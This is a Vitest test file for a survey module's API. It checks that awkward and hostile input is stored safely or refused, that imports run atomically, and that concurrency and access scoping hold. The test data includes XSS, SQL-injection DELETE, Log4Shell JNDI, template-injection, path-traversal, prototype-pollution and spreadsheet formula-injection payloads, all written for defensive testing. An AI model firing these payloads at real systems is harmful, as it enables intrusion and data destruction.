/**
 * What arrives from outside, and what the module does with it.
 *
 * Every string here has come off a phone keyboard, out of a spreadsheet, or
 * out of somebody trying it on. The question each test asks is the same:
 * does the module store it, refuse it with a message, or fall over — and
 * falling over is the only wrong answer.
 */

import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  buildWorld, idem, uniq, workDate, joinProgramme,
  type CatalogueWorld, type Headers,
} from "./fixture.js";

let w: CatalogueWorld;
let programmeId: string;
let villageId: string;
let mandalId: string;

async function send(
  method: "POST" | "GET" | "PATCH", headers: Headers, url: string, payload?: unknown,
) {
  const res = await w.app.inject({
    method, url,
    headers: { ...headers, ...(method === "GET" ? {} : idem()) },
    ...(payload === undefined ? {} : { payload }),
  });
  let body: any = null;
  try { body = res.json(); } catch { body = null; }
  return { status: res.statusCode, body, data: body?.data ?? body };
}
const post = (h: Headers, u: string, p?: unknown) => send("POST", h, u, p);
const get = (h: Headers, u: string) => send("GET", h, u);

beforeAll(async () => {
  w = await buildWorld();
  const district = String((await w.pool.query(
    `INSERT INTO org_units(org_id,type,code,name) VALUES($1,'district',$2,'San district') RETURNING id`,
    [w.orgId, uniq("SD")])).rows[0].id);
  mandalId = String((await w.pool.query(
    `INSERT INTO org_units(org_id,type,code,name,parent_id) VALUES($1,'mandal',$2,'San mandal',$3) RETURNING id`,
    [w.orgId, uniq("SM"), district])).rows[0].id);
  const p = await post(w.admin, "/api/v1/survey/projects",
    { code: uniq("SAN"), name: "Sanitising programme", create_project: false });
  programmeId = String(p.data.id);
  const v = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages`,
    { village_name: "San village", village_code: uniq("SV"), mandal_id: mandalId, total_extent_ac: 90 });
  villageId = String(v.data.id);
}, 180_000);

afterAll(async () => { await w?.app.close(); await w?.pool.end(); });

describe("characters Postgres cannot store", () => {
  it("refuses a null byte rather than failing at the driver", async () => {
    // Postgres rejects a NUL in a text column with an error nobody asked for.
    // Caught here it is a message about the field; caught there it is a 500
    // with a stack trace in the log.
    const r = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages`, {
      village_name: "Village\u0000name", village_code: uniq("NB"), mandal_id: mandalId,
    });
    expect(r.status, JSON.stringify(r.body)).not.toBe(500);
    expect([201, 422]).toContain(r.status);
  });

  it("survives control characters in remarks", async () => {
    const r = await post(w.admin, `/api/v1/survey/villages/${villageId}/stage`, {
      stage_code: "GROUND_TRUTHING", state: "IN_PROGRESS",
      remarks: "Line one\r\nLine two\u001b[31m",
    });
    expect(r.status, JSON.stringify(r.body)).not.toBe(500);
  });
});

describe("things that look like code", () => {
  const hostile = [
    "<script>alert(1)</script>",
    "'; DELETE FROM survey_entries WHERE '1'='1",
    "${jndi:ldap://x/a}",
    "{{7*7}}",
    "../../etc/passwd",
  ];

  it("stores each of them as the text it is, and nothing happens", async () => {
    for (const [i, text] of hostile.entries()) {
      const r = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages`, {
        village_name: text, village_code: uniq(`H${i}`), mandal_id: mandalId,
      });
      expect(r.status, `${text} -> ${JSON.stringify(r.body)}`).toBe(201);
      const back = await w.pool.query(
        `SELECT name FROM org_units
         WHERE id = (SELECT village_id FROM survey_villages WHERE id = $1)`, [r.data.id]);
      // Byte for byte: escaping on the way out is the reader's job, and a
      // store that quietly rewrites what it was given cannot be trusted with
      // a village name either.
      expect(back.rows[0].name).toBe(text);
    }
    const alive = await w.pool.query("SELECT count(*)::int AS n FROM survey_entries");
    expect(alive.rows[0].n).toBeGreaterThanOrEqual(0);
  });

  it("throws out a body carrying __proto__ before anything reads it", async () => {
    // Refused by the JSON parser itself, which is earlier than any schema
    // could manage and the reason the prototype is never reachable from a
    // request body at all.
    const res = await w.app.inject({
      method: "POST", url: "/api/v1/survey/entries",
      headers: { ...w.admin, ...idem(), "content-type": "application/json" },
      payload: `{"survey_village_id":"${villageId}","entry_date":"${workDate()}",` +
        `"teams_deployed":1,"values":{"__proto__":{"polluted":true},"GOVT_LAND_EXTENT_AC":1}}`,
    });
    expect(res.statusCode).toBe(400);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });
});

describe("a spreadsheet written by somebody in a hurry", () => {
  const rows = (r: unknown[]) => ({ rows: r, dry_run: false });

  it("refuses the whole batch rather than half-importing it", async () => {
    const r = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages/import`,
      rows([
        { village_name: "Good one", mandal_name: "San mandal", district_name: "San district",
          total_extent_ac: 10 },
        { village_name: "", mandal_name: "San mandal", district_name: "San district" },
      ]));
    expect(r.status, JSON.stringify(r.body)).not.toBe(500);
  });

  it("does not choke on a formula in a cell", async () => {
    // Excel's leading = is a formula to Excel and a village name to us.
    const r = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages/import`,
      rows([{ village_name: "=cmd|'/c calc'!A1", mandal_name: "San mandal",
        district_name: "San district", total_extent_ac: 5 }]));
    expect(r.status, JSON.stringify(r.body)).not.toBe(500);
  });

  it("refuses a batch far larger than a person would paste", async () => {
    const many = Array.from({ length: 5000 }, (_, i) => ({
      village_name: `Bulk ${i}`, mandal_name: "San mandal",
      district_name: "San district", total_extent_ac: 1,
    }));
    const r = await post(w.admin,
      `/api/v1/survey/projects/${programmeId}/villages/import`, rows(many));
    // Either bounded, or it finishes — never a request that runs until the
    // proxy gives up on it.
    expect([200, 201, 413, 422]).toContain(r.status);
  }, 120_000);
});

describe("the modules either side of it", () => {
  it("a check-out names a village the survey module actually has", async () => {
    // §53: attendance stores survey_village_id, so the two modules have to
    // agree about which villages exist. A dangling reference would leave a
    // punch pointing at a village nobody can open.
    const ref = await w.pool.query(
      `SELECT count(*)::int AS n FROM survey_villages WHERE id = $1`, [villageId]);
    expect(ref.rows[0].n).toBe(1);
    const fk = await w.pool.query(
      `SELECT count(*)::int AS n
       FROM information_schema.table_constraints tc
       JOIN information_schema.key_column_usage kcu ON kcu.constraint_name = tc.constraint_name
       WHERE tc.table_name = 'attendance_events' AND tc.constraint_type = 'FOREIGN KEY'
         AND kcu.column_name = 'survey_village_id'`);
    expect(fk.rows[0].n).toBeGreaterThan(0);
  });

  it("an equipment allocation names an asset the register knows", async () => {
    const r = await post(w.admin, `/api/v1/survey/villages/${villageId}/rovers`, {
      asset_id: "00000000-0000-4000-8000-000000000000", allocated_on: workDate(),
    });
    expect([404, 422]).toContain(r.status);
  });

  it("a crew assignment names an employee the directory knows", async () => {
    const r = await post(w.admin, `/api/v1/survey/villages/${villageId}/crew`, {
      employee_id: "00000000-0000-4000-8000-000000000000", stage_code: "GROUND_TRUTHING",
    });
    expect([404, 422]).toContain(r.status);
  });

  it("a programme paired to a project carries the project's identity", async () => {
    const r = await post(w.admin, "/api/v1/survey/projects", {
      code: uniq("PAIR"), name: "Paired programme", create_project: true,
    });
    expect(r.status, JSON.stringify(r.body)).toBe(201);
    expect(r.data.project_id).toBeTruthy();
    const proj = await w.pool.query("SELECT name FROM projects WHERE id = $1", [r.data.project_id]);
    expect(proj.rows).toHaveLength(1);
  });
});

describe("two people at once", () => {
  it("lets exactly one of two simultaneous returns through", async () => {
    // Both crew members file the village's day at the same moment. One return
    // is the record; two would double the day in every total above it.
    const v = await post(w.admin, `/api/v1/survey/projects/${programmeId}/villages`,
      { village_name: "Race village", village_code: uniq("RV"), mandal_id: mandalId,
        total_extent_ac: 50 });
    const day = workDate();
    const both = await Promise.all([1, 2].map(n => post(w.admin, "/api/v1/survey/entries", {
      survey_village_id: v.data.id, entry_date: day,
      teams_deployed: n, values: { GOVT_LAND_EXTENT_AC: n },
    })));
    expect(both.filter(r => r.status === 201)).toHaveLength(1);
    const kept = await w.pool.query(
      "SELECT count(*)::int AS n FROM survey_entries WHERE survey_village_id = $1", [v.data.id]);
    expect(kept.rows[0].n).toBe(1);
  });
});

describe("a crew member who is on the programme", () => {
  it("can file their own village, and only theirs", async () => {
    await joinProgramme(w.pool, w.orgId, w.roleUserId.TEAM_LEAD, programmeId);
    const mine = await post(w.role.TEAM_LEAD, "/api/v1/survey/entries", {
      survey_village_id: villageId, entry_date: workDate(),
      teams_deployed: 1, values: { GOVT_LAND_EXTENT_AC: 2 },
    });
    expect([201, 409], JSON.stringify(mine.body)).toContain(mine.status);

    const other = await post(w.admin, "/api/v1/survey/projects",
      { code: uniq("ELSE"), name: "Elsewhere", create_project: false });
    const theirs = await post(w.admin, `/api/v1/survey/projects/${other.data.id}/villages`,
      { village_name: "Elsewhere village", village_code: uniq("EV"), mandal_id: mandalId });
    const reach = await post(w.role.TEAM_LEAD, "/api/v1/survey/entries", {
      survey_village_id: theirs.data.id, entry_date: workDate(),
      teams_deployed: 1, values: { GOVT_LAND_EXTENT_AC: 2 },
    });
    expect(reach.status).toBe(404);
  });
});
